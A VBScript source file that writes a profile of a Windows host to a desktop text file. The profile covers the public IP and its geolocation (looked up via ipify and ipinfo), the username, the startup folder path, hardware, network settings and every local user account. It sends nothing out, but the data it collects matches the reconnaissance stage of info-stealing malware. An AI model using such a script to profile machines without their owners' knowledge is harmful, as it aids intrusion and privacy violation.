Set objFSO = CreateObject("Scripting.FileSystemObject")
Set objXMLHttp = CreateObject("MSXML2.XMLHTTP")
Set objWScriptShell = CreateObject("WScript.Shell")
Set objWMIService = GetObject("winmgmts:\\.\root\cimv2")
Set objShell = CreateObject("WScript.Shell")
strDesktopPath = objShell.SpecialFolders("Desktop") 

' Create the file path
strFilePath = strDesktopPath & "\details.txt"

' Create the text file
Set objFSO = CreateObject("Scripting.FileSystemObject")
Set objFile = objFSO.CreateTextFile(strFilePath, True) 

' Function to read the file content
Function ReadFile(filePath)
    Dim fso, file, content
    Set fso = CreateObject("Scripting.FileSystemObject")
    Set file = fso.OpenTextFile(filePath, 1)
    content = file.ReadAll
    file.Close
    ReadFile = content
End Function

' Get the data
objXMLHttp.open "GET", "http://api.ipify.org", False
objXMLHttp.send
strPublicIP = objXMLHttp.responseText

Const ssfSTARTUP = &H7
Set oShell = CreateObject("Shell.Application")
Set startupFolder = oShell.NameSpace(ssfSTARTUP)
If Not startupFolder Is Nothing Then
    startupFolderPath = startupFolder.Self.Path
End If

strUsername = objWScriptShell.ExpandEnvironmentStrings("%USERNAME%")

objFile.WriteLine "IP: " & strPublicIP
objFile.WriteLine "User: " & strUsername
objFile.WriteLine "Main Directory: " & strFolderPath
objFile.WriteLine "Startup Directory: " & startupFolderPath

' Operating System Information
objFile.WriteLine "============================================================================================="
objFile.WriteLine "Os info->"
Set colOperatingSystems = objWMIService.ExecQuery("Select * from Win32_OperatingSystem")
For Each objOperatingSystem in colOperatingSystems
    objFile.WriteLine "Operating System: " & objOperatingSystem.Caption
    objFile.WriteLine "Version: " & objOperatingSystem.Version
    objFile.WriteLine "Build Number: " & objOperatingSystem.BuildNumber
    objFile.WriteLine "OS Architecture: " & objOperatingSystem.OSArchitecture ' (32-bit or 64-bit)
    objFile.WriteLine "Service Pack: " & objOperatingSystem.ServicePackMajorVersion & "." & objOperatingSystem.ServicePackMinorVersion
    objFile.WriteLine "Install Date: " & objOperatingSystem.InstallDate
    objFile.WriteLine "System Directory: " & objOperatingSystem.SystemDirectory
    objFile.WriteLine "Windows Directory: " & objOperatingSystem.WindowsDirectory
    objFile.WriteLine "Serial Number: " & objOperatingSystem.SerialNumber
    objFile.WriteLine "Manufacturer: " & objOperatingSystem.Manufacturer
    objFile.WriteLine
Next

' Computer System Information (for more hardware-related info)
objFile.WriteLine "============================================================================================="
objFile.WriteLine "Hardware info->"
Set colComputerSystem = objWMIService.ExecQuery("Select * from Win32_ComputerSystem")
For Each objComputer in colComputerSystem
    objFile.WriteLine "Computer Name: " & objComputer.Name
    objFile.WriteLine "Manufacturer: " & objComputer.Manufacturer
    objFile.WriteLine "Model: " & objComputer.Model
    objFile.WriteLine
Next

' Get CPU info
objFile.WriteLine "============================================================================================="
objFile.WriteLine "Cpu info->"
Set colItems = objWMIService.ExecQuery("Select * from Win32_Processor")
For Each objItem in colItems
    objFile.WriteLine "CPU: " & objItem.Name
    objFile.WriteLine "Cores: " & objItem.NumberOfCores
    objFile.WriteLine "Clock Speed: " & objItem.CurrentClockSpeed & " MHz"
    objFile.WriteLine
Next

' Get memory info
objFile.WriteLine "============================================================================================="
objFile.WriteLine "Memory info->"
Set colItems = objWMIService.ExecQuery("Select * from Win32_OperatingSystem")
For Each objItem in colItems
    objFile.WriteLine "Total Physical Memory: " & objItem.TotalVisibleMemorySize / 1024 & " MB"
    objFile.WriteLine "Free Physical Memory: " & objItem.FreePhysicalMemory / 1024 & " MB"
    objFile.WriteLine
Next

' Get disk drive info
objFile.WriteLine "============================================================================================="
objFile.WriteLine "Disk Drive info->"
Set colItems = objWMIService.ExecQuery("Select * from Win32_LogicalDisk where DriveType=3")
For Each objItem in colItems
    objFile.WriteLine "Drive: " & objItem.DeviceID
    objFile.WriteLine "Total Size: " & objItem.Size / 1024 / 1024 / 1024 & " GB"
    objFile.WriteLine "Free Space: " & objItem.FreeSpace / 1024 / 1024 / 1024 & " GB"
    objFile.WriteLine
Next

' Get network info
objFile.WriteLine "============================================================================================="
objFile.WriteLine "Network info->"
Set colItems = objWMIService.ExecQuery("Select * from Win32_NetworkAdapterConfiguration where IPEnabled=True")
For Each objItem in colItems
    objFile.WriteLine "Adapter Name: " & objItem.Description
    objFile.WriteLine "IP Address: " & Join(objItem.IPAddress, ", ")
    objFile.WriteLine "MAC Address: " & objItem.MACAddress
    objFile.WriteLine "Subnet Mask: " & Join(objItem.IPSubnet, ", ")
    
    ' Check if DefaultIPGateway is not Null and then use Join
    If Not IsNull(objItem.DefaultIPGateway) Then
        objFile.WriteLine "Default Gateway: " & Join(objItem.DefaultIPGateway, ", ")
    Else
        objFile.WriteLine "Default Gateway: N/A"
    End If
    ' Check if DNSServerSearchOrder is not Null and then use Join
    If Not IsNull(objItem.DNSServerSearchOrder) Then
        objFile.WriteLine "DNS Server: " & Join(objItem.DNSServerSearchOrder, ", ")
    Else
        objFile.WriteLine "DNS Server: N/A"
    End If
    objFile.WriteLine
Next

' Get graphics card info
objFile.WriteLine "============================================================================================="
objFile.WriteLine "Graphics/Video info->"
Set colItems = objWMIService.ExecQuery("Select * from Win32_VideoController")
For Each objItem in colItems
    objFile.WriteLine "Graphics Card: " & objItem.Name
    objFile.WriteLine "Video Memory: " & objItem.AdapterRAM / 1024 / 1024 & " MB"
    objFile.WriteLine "Video Mode: " & objItem.VideoModeDescription
    objFile.WriteLine "Driver Version: " & objItem.DriverVersion
    objFile.WriteLine
Next

' Get user info
objFile.WriteLine "============================================================================================="
objFile.WriteLine "Users info->"
Set colItems = objWMIService.ExecQuery("Select * from Win32_ComputerSystem")
For Each objItem in colItems
    objFile.WriteLine "Current User: " & objItem.UserName
    objFile.WriteLine "Domain: " & objItem.Domain
Next

' Get last boot time (from Win32_OperatingSystem)
Set colBoot = objWMIService.ExecQuery("Select * from Win32_OperatingSystem")
For Each objBoot in colBoot
    objFile.WriteLine "Last Boot Up Time: " & objBoot.LastBootUpTime
Next

' Get list of all user accounts
Set colUsers = objWMIService.ExecQuery("Select * from Win32_UserAccount")
For Each objUser in colUsers
    objFile.WriteLine "User Account: " & objUser.Name
    objFile.WriteLine "Full Name: " & objUser.FullName
    objFile.WriteLine "Account Disabled: " & objUser.Disabled
    objFile.WriteLine
Next


' Get system timezone information
objFile.WriteLine "============================================================================================="
objFile.WriteLine "Timezone Info->"
Set colTimezone = objWMIService.ExecQuery("Select * from Win32_TimeZone")
For Each objItem In colTimezone
    objFile.WriteLine "Timezone: " & objItem.Description
    objFile.WriteLine "Time Zone Standard Name: " & objItem.StandardName
    objFile.WriteLine "Daylight Saving Time: " & objItem.DaylightName
Next

' Get current system time using the Now function
currentTime = Now
objFile.WriteLine "Current System Time: " & currentTime
objFile.WriteLine

' Get system location information
objFile.WriteLine "============================================================================================="
objFile.WriteLine "Location Info->"
Dim http
' Create HTTP object to send a GET request
Set http = CreateObject("MSXML2.ServerXMLHTTP.6.0")
http.open "GET", "http://ipinfo.io/" & strPublicIP & "/json", False
http.setRequestHeader "Content-Type", "application/json"
http.send

objFile.WriteLine http.responseText
objFile.WriteLine
Set http = Nothing


objFile.Close
